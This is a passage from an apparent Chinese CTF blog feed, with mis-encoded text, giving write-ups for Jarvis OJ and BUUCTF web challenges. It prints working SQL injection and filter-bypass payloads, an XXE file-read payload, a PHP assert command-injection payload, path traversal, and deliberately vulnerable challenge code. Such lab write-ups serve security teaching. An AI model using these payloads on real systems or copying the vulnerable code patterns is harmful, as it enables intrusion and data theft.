&lt;li&gt;id=0&lt;/li&gt;
&lt;li&gt;bé•¿åº¦è¦å¤§äº5ä½†æ˜¯è¦æ»¡è¶³ç¬¬äºŒã€ä¸‰å±‚è¦é•¿åº¦ä¸º0ï¼Œè¿™æ—¶å€™å°±è¦è®©b=%0011111ï¼Œstrlenä¸ä¼šè¢«æˆªæ–­ï¼Œsubsträ¼šè¢«æˆªæ–­&lt;/li&gt;
&lt;li&gt;ç„¶åè®©æˆ‘ä»¬è®¿é—®&lt;a href=&#34;http://web.jarvisoj.com:32780/%5eHT2mCpcvOLf/index.php?id=1%EF%BC%8C%E5%8F%88%E7%9C%8B%E5%88%B0%E4%BA%86id=1%EF%BC%8C%E6%9C%89%E5%8F%AF%E8%83%BD%E6%98%AF%E6%B3%A8%E5%85%A5&#34;&gt;http://web.jarvisoj.com:32780/%5eHT2mCpcvOLf/index.php?id=1ï¼Œåˆçœ‹åˆ°äº†id=1ï¼Œæœ‰å¯èƒ½æ˜¯æ³¨å…¥&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;ç”¨å•å¼•å·æµ‹è¯•å‘ç°ç›´æ¥è¿”å›äº†sqlè¯­å¥ï¼Œé‚£çœ‹æ¥åº”è¯¥å°±æ˜¯sqlæ³¨å…¥äº†&lt;/li&gt;
&lt;li&gt;æµ‹è¯•å‘ç°è¿‡æ»¤äº†ç©ºæ ¼è¿™ä¸ªå¯ä»¥ç”¨æ³¨é‡Šç¬¦/**/ç»•è¿‡ï¼Œä½†æ˜¯å‘ç°ç›´æ¥ç”¨ä¼šè¢«è¿‡æ»¤ï¼Œè¯•ç€å¾€é‡Œé¢åŠ ç‚¹ä¸œè¥¿å°±å¥½äº†&lt;/li&gt;
&lt;li&gt;ç”¨&lt;code&gt;http://web.jarvisoj.com:32780/%5eHT2mCpcvOLf/index.php?id=1/*1*/order/*1*/by/*1*/3#&lt;/code&gt;æµ‹è¯•å¾—åˆ°å­—æ®µæ•°ä¸º3&lt;/li&gt;
&lt;li&gt;ç”¨&lt;code&gt;http://web.jarvisoj.com:32780/%5eHT2mCpcvOLf/index.php?id=0/*1*/ununionion/*1*/selselectect/*1*/1,2,database()/*1*/#&lt;/code&gt;æ‹¿åˆ°æ•°æ®åº“åæ˜¯test&lt;/li&gt;
&lt;li&gt;ç”¨&lt;code&gt;http://web.jarvisoj.com:32780/%5eHT2mCpcvOLf/index.php?id=0/*1*/ununionion/*1*/selselectect/*1*/1,2,table_name/*1*/frofromm/*1*/information_schema.tables/*1*/where/*1*/table_schema=0x74657374#&lt;/code&gt;æ‹¿åˆ°è¡¨åcontent&lt;/li&gt;
&lt;li&gt;ç”¨&lt;code&gt;http://web.jarvisoj.com:32780/%5eHT2mCpcvOLf/index.php?id=0/*1*/ununionion/*1*/selselectect/*1*/1,2,group_concat(column_name)/*1*/frofromm/*1*/information_schema.columns/*1*/where/*1*/table_name=0x636f6e74656e74#&lt;/code&gt;å¾—åˆ°å­—æ®µåæ˜¯id,context,title&lt;/li&gt;
&lt;li&gt;ç”¨&lt;code&gt;http://web.jarvisoj.com:32780/%5eHT2mCpcvOLf/index.php?id=0/*1*/ununionion/*1*/selselectect/*1*/1,2,group_concat(context)/*1*/frofromm/*1*/content#&lt;/code&gt;æ‹¿åˆ°flag&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;apiè°ƒç”¨&#34;&gt;&lt;a href=&#34;#apiè°ƒç”¨&#34; class=&#34;headerlink&#34; title=&#34;apiè°ƒç”¨&#34;&gt;&lt;/a&gt;apiè°ƒç”¨&lt;/h2&gt;&lt;p&gt;ç”±äºé»˜è®¤ä¼ è¾“æ˜¯jsonæ ¼å¼ï¼Œå…ˆæŠ“åŒ…æŠŠæ ¼å¼æ”¹æˆxmlï¼Œç„¶åä¼ payload&lt;code&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;ISO-8859-1&amp;quot;?&amp;gt;  &amp;lt;!DOCTYPE foo [  &amp;lt;!ENTITY myentity SYSTEM &amp;quot;file:///home/ctf/flag.txt&amp;quot; &amp;gt;]&amp;gt;  &amp;lt;abc&amp;gt;&amp;amp;myentity;&amp;lt;/abc&amp;gt;&lt;/code&gt;å°±æ‹¿åˆ°äº†flag&lt;/p&gt;
&lt;h2 id=&#34;WEBï¼Ÿ&#34;&gt;&lt;a href=&#34;#WEBï¼Ÿ&#34; class=&#34;headerlink&#34; title=&#34;WEBï¼Ÿ&#34;&gt;&lt;/a&gt;WEBï¼Ÿ&lt;/h2&gt;&lt;p&gt;ä¸€å¼€å§‹è¿˜çœ‹ä¸æ‡‚é¢˜ç›®è¦å¹²å˜›ï¼Œç„¶åæŸ¥çœ‹æºä»£ç çœ‹åˆ°ä¸€å †Jsï¼Œç„¶åç”¨è°·æ­Œæ’ä»¶ç¾åŒ–ä¸€ä¸‹ï¼ˆå®‰åˆ©ä¸€ä¸‹JavaScript and CSS Code Beautifierï¼‰ï¼Œæ–¹ä¾¿çœ‹ä»£ç ã€‚ç„¶åå‘ç°æœ‰ä¸¤ä¸‡è¡Œçš„ä»£ç ã€‚ã€‚ã€‚ã€‚çœ‹WPçŸ¥é“äº†ç”¨passwordå…³é”®è¯æ¥å¼€å§‹å®¡è®¡ã€‚å¤§æ¦‚å°±æ˜¯çŸ©é˜µA*B=C,å·²çŸ¥Bï¼ŒCæ±‚Aã€‚ï¼ˆçº¿ä»£çŸ¥è¯†æ—©å°±å¿˜å¾—å·®ä¸å¤šäº†ï¼‰&lt;/p&gt;
&lt;h2 id=&#34;babyphp&#34;&gt;&lt;a href=&#34;#babyphp&#34; class=&#34;headerlink&#34; title=&#34;babyphp&#34;&gt;&lt;/a&gt;babyphp&lt;/h2&gt;&lt;p&gt;æ”»é˜²ä¸–ç•ŒåŸé¢˜ï¼Œå…ˆæ˜¯githackæ‹¿åˆ°æºç ï¼Œç„¶åassertä»»æ„ä»£ç æ‰§è¡Œæ‹¿åˆ°flagï¼Œç”¨â€™)é—­åˆç„¶åä»»æ„æ‰§è¡Œä»£ç &lt;br&gt;payloadï¼š&lt;code&gt;?page=2&amp;#39;) or system(&amp;quot;cat templates/flag.php&amp;quot;);//&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;inject&#34;&gt;&lt;a href=&#34;#inject&#34; class=&#34;headerlink&#34; title=&#34;inject&#34;&gt;&lt;/a&gt;inject&lt;/h2&gt;&lt;p&gt;æç¤ºè¯´å…ˆæ‹¿åˆ°æºç å†è¯´ï¼Œçœ‹äº†WPçŸ¥é“è¦è¯•å¸¸è§çš„å¤‡ä»½æ–‡ä»¶åï¼Œå¸¸è§çš„å¤‡ä»½æ–‡ä»¶ä¸´æ—¶æ–‡ä»¶åï¼Œæ¯”å¦‚.bakã€.swpã€.saveã€&lt;del&gt;ç­‰ï¼Œç„¶åè¿™ä¸€é¢˜æ˜¯åœ¨index.php&lt;/del&gt;â€¦..æ‹¿åˆ°æºç &lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;require&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;config.php&amp;quot;&lt;/span&gt;);&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$table&lt;/span&gt; = &lt;span class=&#34;hljs-variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;table&amp;#x27;&lt;/span&gt;]?&lt;span class=&#34;hljs-variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;table&amp;#x27;&lt;/span&gt;]:&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;test&amp;quot;&lt;/span&gt;;&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$table&lt;/span&gt; = Filter(&lt;span class=&#34;hljs-variable&#34;&gt;$table&lt;/span&gt;);&lt;br&gt;mysqli_query(&lt;span class=&#34;hljs-variable&#34;&gt;$mysqli&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;desc `secret_&lt;span class=&#34;hljs-subst&#34;&gt;&amp;#123;$table&amp;#125;&lt;/span&gt;`&amp;quot;&lt;/span&gt;) &lt;span class=&#34;hljs-keyword&#34;&gt;or&lt;/span&gt; Hacker();&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$sql&lt;/span&gt; = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;select &amp;#x27;flag&amp;#123;xxx&amp;#125;&amp;#x27; from secret_&lt;span class=&#34;hljs-subst&#34;&gt;&amp;#123;$table&amp;#125;&lt;/span&gt;&amp;quot;&lt;/span&gt;;&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$ret&lt;/span&gt; = sql_query(&lt;span class=&#34;hljs-variable&#34;&gt;$sql&lt;/span&gt;);&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$ret&lt;/span&gt;[&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;];&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;åº”è¯¥æ˜¯sqlæ³¨å…¥çš„é¢˜ç›®ï¼Œå…ˆæ˜¯è¦æˆåŠŸæ‰§è¡Œdesc &lt;code&gt;secret_&amp;#123;$table&amp;#125;&lt;/code&gt;ï¼Œç„¶ååˆ©ç”¨ä¸‹é¢çš„sqlè¯­å¥æ‹¿åˆ°flagã€‚desc table_nameéœ€è¦è¡¨å­˜åœ¨ï¼Œè¿™æ ·å°±é™åˆ¶äº†æ³¨å…¥ï¼Œå› æ­¤åº”è¯¥å°±æ˜¯è¦åœ¨è¿™é‡Œä¸‹åŠŸå¤«ã€‚&lt;br&gt;å› ä¸ºdesc &lt;code&gt;test&lt;/code&gt; &lt;code&gt;aaa&lt;/code&gt;,åªè¦ç¬¬ä¸€ä¸ªè¡¨å­˜åœ¨å°±ä¼šæ‰§è¡Œï¼Œä½†æ˜¯å¦‚æœæ˜¯å•å¼•å·å°±ä¸ä¼šæ‰§è¡Œï¼Œè¿™ä¸€è¦è€ƒæ ¸çš„åº”è¯¥å°±æ˜¯è¿™ä¸ªç‚¹ã€‚ç„¶åå°±å¯ä»¥æ„é€ payloadï¼šâ€?table=test&lt;code&gt; &lt;/code&gt;union select database() limit 1,1â€æ‹¿åˆ°æ•°æ®åº“å61d300ï¼Œæ³¨æ„è¦åŠ limitï¼Œä¸ç„¶ç›´ä¼šè¿”å›Dã€‚ç„¶åæ„é€ payloadï¼šâ€œ?table=test&lt;code&gt; &lt;/code&gt;union select table_name from information_schema.tables where table_schema=0x363164333030 limit 1,1â€ï¼Œæ‹¿åˆ°è¡¨åsecret_flagï¼Œæ³¨æ„ç”¨åå…­è¿›åˆ¶è¿‡wafã€‚åŒæ ·åŠæ³•æ‹¿åˆ°åˆ—åflagUwillNeverKnowï¼Œç„¶åæ‹¿åˆ°flagï¼šflag{luckyGame~}&lt;/p&gt;
&lt;h2 id=&#34;phpinfo&#34;&gt;&lt;a href=&#34;#phpinfo&#34; class=&#34;headerlink&#34; title=&#34;phpinfo&#34;&gt;&lt;/a&gt;phpinfo&lt;/h2&gt;&lt;p&gt;sessionçš„åºåˆ—åŒ–æ–¹æ³•ä¸åŒå¯¼è‡´çš„æ¼æ´ï¼Œè¿˜æœ‰å°±æ˜¯å¦‚ä½•å¾€sessioné‡ŒåŠ å…¥payload&lt;/p&gt;
&lt;h2 id=&#34;REï¼Ÿ&#34;&gt;&lt;a href=&#34;#REï¼Ÿ&#34; class=&#34;headerlink&#34; title=&#34;REï¼Ÿ&#34;&gt;&lt;/a&gt;REï¼Ÿ&lt;/h2&gt;&lt;p&gt;ä¸‹è½½äº†ä¸ªudf.soæ–‡ä»¶ï¼Œä¸çŸ¥é“è¿™æ˜¯å•¥å°±ä¸Šç½‘æœäº†ä¸€ä¸‹ï¼Œ&lt;a href=&#34;https://www.cnblogs.com/sijidou/p/10522972.html&#34;&gt;https://www.cnblogs.com/sijidou/p/10522972.html&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;flagåœ¨ç®¡ç†å‘˜æ‰‹é‡Œ&#34;&gt;&lt;a href=&#34;#flagåœ¨ç®¡ç†å‘˜æ‰‹é‡Œ&#34; class=&#34;headerlink&#34; title=&#34;flagåœ¨ç®¡ç†å‘˜æ‰‹é‡Œ&#34;&gt;&lt;/a&gt;flagåœ¨ç®¡ç†å‘˜æ‰‹é‡Œ&lt;/h2&gt;&lt;p&gt;å…ˆæŠ“ä¸ªåŒ…ï¼Œçœ‹åˆ°cookieé‡Œæœ‰ä¸€ä¸ªadmin=0ï¼Œæ”¹æˆ1ä¸è¡Œï¼Œè¿˜æœ‰ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œurlè§£ç ä»¥åå‘ç°æ˜¯s:5:â€guestâ€;è¯•ä¸€ä¸‹æ”¹æˆadminå¾ˆæ˜¾ç„¶ä¹Ÿæ˜¯ä¸è¡Œçš„ï¼Œè¿˜æœ‰å°±æ˜¯ä¸€ä¸ªå“ˆå¸Œå€¼ï¼Œä¼°è®¡ç›´æ¥çˆ†ç ´ä¹Ÿæ˜¯ä¸è¡Œçš„ï¼Œåˆ°è¿™é‡Œå°±æ–­äº†æ€è·¯ã€‚ç„¶åçœ‹WPè¯´æ‰¾æºç ï¼Œä¸€æ ·çš„index.php~æ‹¿åˆ°ä¸€ä¸ªå®è´¨ä¸º.swpçš„vimå¼‚å¸¸é€€å‡ºæ–‡ä»¶ï¼Œç„¶åå°±åˆ†æä¸€ä¸‹æºç &lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?php&lt;/span&gt; &lt;br&gt;	&lt;span class=&#34;hljs-variable&#34;&gt;$auth&lt;/span&gt; = &lt;span class=&#34;hljs-literal&#34;&gt;false&lt;/span&gt;;&lt;br&gt;	&lt;span class=&#34;hljs-variable&#34;&gt;$role&lt;/span&gt; = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;guest&amp;quot;&lt;/span&gt;;&lt;br&gt;	&lt;span class=&#34;hljs-variable&#34;&gt;$salt&lt;/span&gt; = &lt;br&gt;	&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;hljs-keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$_COOKIE&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;role&amp;quot;&lt;/span&gt;])) &amp;#123;&lt;br&gt;	    &lt;span class=&#34;hljs-variable&#34;&gt;$role&lt;/span&gt; = unserialize(&lt;span class=&#34;hljs-variable&#34;&gt;$_COOKIE&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;role&amp;quot;&lt;/span&gt;]);&lt;br&gt;	    &lt;span class=&#34;hljs-variable&#34;&gt;$hsh&lt;/span&gt; = &lt;span class=&#34;hljs-variable&#34;&gt;$_COOKIE&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;hsh&amp;quot;&lt;/span&gt;];&lt;br&gt;	    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;hljs-variable&#34;&gt;$role&lt;/span&gt;===&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;admin&amp;quot;&lt;/span&gt; &amp;amp;&amp;amp; &lt;span class=&#34;hljs-variable&#34;&gt;$hsh&lt;/span&gt; === md5(&lt;span class=&#34;hljs-variable&#34;&gt;$salt&lt;/span&gt;.strrev(&lt;span class=&#34;hljs-variable&#34;&gt;$_COOKIE&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;role&amp;quot;&lt;/span&gt;]))) &amp;#123;&lt;br&gt;	        &lt;span class=&#34;hljs-variable&#34;&gt;$auth&lt;/span&gt; = &lt;span class=&#34;hljs-literal&#34;&gt;true&lt;/span&gt;;&lt;br&gt;	    &amp;#125; &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;br&gt;	        &lt;span class=&#34;hljs-variable&#34;&gt;$auth&lt;/span&gt; = &lt;span class=&#34;hljs-literal&#34;&gt;false&lt;/span&gt;;&lt;br&gt;	    &amp;#125;&lt;br&gt;	&amp;#125; &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;br&gt;	    &lt;span class=&#34;hljs-variable&#34;&gt;$s&lt;/span&gt; = serialize(&lt;span class=&#34;hljs-variable&#34;&gt;$role&lt;/span&gt;);&lt;br&gt;	    setcookie(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;role&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;hljs-variable&#34;&gt;$s&lt;/span&gt;);&lt;br&gt;	    &lt;span class=&#34;hljs-variable&#34;&gt;$hsh&lt;/span&gt; = md5(&lt;span class=&#34;hljs-variable&#34;&gt;$salt&lt;/span&gt;.strrev(&lt;span class=&#34;hljs-variable&#34;&gt;$s&lt;/span&gt;));&lt;br&gt;	    setcookie(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;hsh&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;hljs-variable&#34;&gt;$hsh&lt;/span&gt;);&lt;br&gt;	&amp;#125;&lt;br&gt;	&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;hljs-variable&#34;&gt;$auth&lt;/span&gt;) &amp;#123;&lt;br&gt;	    &lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;lt;h3&amp;gt;Welcome Admin. Your flag is &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;	&amp;#125; else &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;	    echo &amp;quot;&lt;/span&gt;&amp;lt;h3&amp;gt;Only Admin can see the flag!!&amp;lt;/h3&amp;gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;å¯ä»¥çœ‹åˆ°å“ˆå¸Œå€¼æ˜¯md5(salt+åå‘â€œadminâ€)ï¼›åº”è¯¥æ˜¯å“ˆå¸Œçš„æŸç§æ”»å‡»æ–¹æ³•ã€‚äº†è§£åˆ°åº”è¯¥å¯ä»¥è¿›è¡Œå“ˆå¸Œé•¿åº¦æ‹“å±•æ”»å‡»ã€‚&lt;br&gt;ï¼ˆå‚è€ƒ&lt;a href=&#34;https://www.cnblogs.com/pcat/p/5478509.html%EF%BC%89&#34;&gt;https://www.cnblogs.com/pcat/p/5478509.htmlï¼‰&lt;/a&gt;&lt;br&gt;PCTF{H45h_ext3ndeR_i5_easy_to_us3}&lt;/p&gt;
&lt;h2 id=&#34;Chopper&#34;&gt;&lt;a href=&#34;#Chopper&#34; class=&#34;headerlink&#34; title=&#34;Chopper&#34;&gt;&lt;/a&gt;Chopper&lt;/h2&gt;&lt;p&gt;è¿›å…¥ç®¡ç†å‘˜ç™»é™†ç•Œé¢ï¼ŒæŸ¥çœ‹æºä»£ç å‘ç°â€œadmin ip is 202.5.19.128â€ï¼›&lt;/p&gt;
&lt;h2 id=&#34;Simple-Injection&#34;&gt;&lt;a href=&#34;#Simple-Injection&#34; class=&#34;headerlink&#34; title=&#34;Simple Injection&#34;&gt;&lt;/a&gt;Simple Injection&lt;/h2&gt;&lt;p&gt;å‘ç°å½“è¾“å…¥çš„è´¦å·æ˜¯adminçš„æ—¶å€™å›æ˜¾æ˜¯å¯†ç é”™è¯¯ï¼Œè¾“å…¥å…¶ä»–è´¦æˆ·çš„æ—¶å€™å›æ˜¾æ˜¯å¯†ç é”™è¯¯ã€‚å½“è´¦æˆ·åç”¨adminâ€™ #å‘ç°å¯ä»¥ä½†æ˜¯ç”¨adminâ€™ and 1=1 #æ—¶è¢«è¿‡æ»¤äº†ï¼Œå†è¯•ä¸€ä¸‹&lt;code&gt;admin&amp;#39;/**/and/**/&lt;/code&gt;å‘ç°æ²¡æœ‰è¢«è¿‡æ»¤ï¼Œä¹Ÿå°±æ˜¯è¿™é‡Œå­˜åœ¨æ³¨å…¥ç‚¹ï¼Œæ ¹æ®å›æ˜¾å¯ä»¥å°è¯•boolç›²æ³¨æˆ–è€…æ—¶é—´ç›²æ³¨ã€‚&lt;br&gt;ä¸è¿‡çœ‹äº†WPæ‰å‘ç°è¿˜æœ‰ä¸€ç§æ›´ç®€å•çš„æ–¹æ³•&lt;br&gt;ç›´æ¥ç”¨payload&lt;code&gt;username=miracle778&amp;#39;/**/union(select(md5(&amp;#39;123&amp;#39;)))#&amp;amp;password=123&lt;/code&gt;å°±èƒ½æ‹¿åˆ°flag&lt;/p&gt;
</content>
        <updated>2019-11-27T14:22:21.000Z</updated>
    </entry>
    <entry>
        <id>http://blog.m1n.me/2019/11/20/BUUCTF-WP/</id>
        <title>BUUCTF-WP</title>
        <link rel="alternate" href="http://blog.m1n.me/2019/11/20/BUUCTF-WP/"/>
        <content type="html">&lt;p&gt;BUUCTFéƒ¨åˆ†é¢˜è§£&lt;br&gt;OJé“¾æ¥&lt;a href=&#34;https://buuoj.cn/challenges&#34;&gt;https://buuoj.cn/challenges&lt;/a&gt;&lt;/p&gt;
&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;
&lt;h1 id=&#34;Web&#34;&gt;&lt;a href=&#34;#Web&#34; class=&#34;headerlink&#34; title=&#34;Web&#34;&gt;&lt;/a&gt;Web&lt;/h1&gt;&lt;h2 id=&#34;HCTF-2018-WarmUp&#34;&gt;&lt;a href=&#34;#HCTF-2018-WarmUp&#34; class=&#34;headerlink&#34; title=&#34;[HCTF 2018]WarmUp&#34;&gt;&lt;/a&gt;[HCTF 2018]WarmUp&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;å…ˆæŸ¥çœ‹ç½‘é¡µæºä»£ç ï¼Œå‘ç°source.phpï¼Œå°±è¯»åˆ°äº†æºç ï¼Œç„¶åè¿˜æœ‰ä¸€ä¸ªhint.phpå¯ä»¥çœ‹åˆ°flagåœ¨ffffllllaaaagggg&lt;/li&gt;
&lt;li&gt;åˆ†æä¸€ä¸‹æºç ï¼š&lt;figure class=&#34;highlight autoit&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs autoit&#34;&gt;$_page = mb_substr(&lt;br&gt;                $page,&lt;br&gt;                &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;br&gt;                mb_strpos($page . &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;?&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;?&amp;#x27;&lt;/span&gt;)&lt;br&gt;            )&lt;span class=&#34;hljs-comment&#34;&gt;;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
å¯ä»¥çœ‹åˆ°å®ƒæ˜¯æ ¹æ®?çš„ä½ç½®æ¥æˆªå–ï¼Œå› æ­¤å¯ä»¥æ„é€ paylaodï¼š&lt;code&gt;?file=hint.php?../../../../../../../ffffllllaaaagggg&lt;/code&gt;å°±è¯»åˆ°äº†flag&lt;h2 id=&#34;å¼ºç½‘æ¯-2019-éšä¾¿æ³¨&#34;&gt;&lt;a href=&#34;#å¼ºç½‘æ¯-2019-éšä¾¿æ³¨&#34; class=&#34;headerlink&#34; title=&#34;[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨&#34;&gt;&lt;/a&gt;[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨&lt;/h2&gt;&lt;/li&gt;
&lt;li&gt;å…ˆç”¨å•å¼•å·é—­åˆï¼Œå‘ç°æŠ¥é”™ï¼Œç„¶åç”¨order byæµ‹è¯•å‡ºå­—æ®µæ•°ä¸º2ï¼Œå†å°è¯•unionæ³¨å…¥å‘ç°è¿‡æ»¤ï¼š&lt;code&gt;return preg_match(&amp;quot;/select|update|delete|drop|insert|where|\./i&amp;quot;,$inject);&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;payload:&lt;code&gt;1&amp;#39;;show databases #&lt;/code&gt;æ‹¿åˆ°æ•°æ®åº“å&lt;br&gt;array(1) {&lt;br&gt; [0]=&amp;gt;&lt;br&gt; string(11) â€œctftrainingâ€&lt;br&gt;}&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;array(1) {&lt;br&gt;  [0]=&amp;gt;&lt;br&gt;  string(18) â€œinformation_schemaâ€&lt;br&gt;}&lt;/p&gt;
&lt;p&gt;array(1) {&lt;br&gt;  [0]=&amp;gt;&lt;br&gt;  string(5) â€œmysqlâ€&lt;br&gt;}&lt;/p&gt;
&lt;p&gt;array(1) {&lt;br&gt;  [0]=&amp;gt;&lt;br&gt;  string(18) â€œperformance_schemaâ€&lt;br&gt;}&lt;/p&gt;
&lt;p&gt;array(1) {&lt;br&gt;  [0]=&amp;gt;&lt;br&gt;  string(9) â€œsupersqliâ€&lt;br&gt;}&lt;/p&gt;
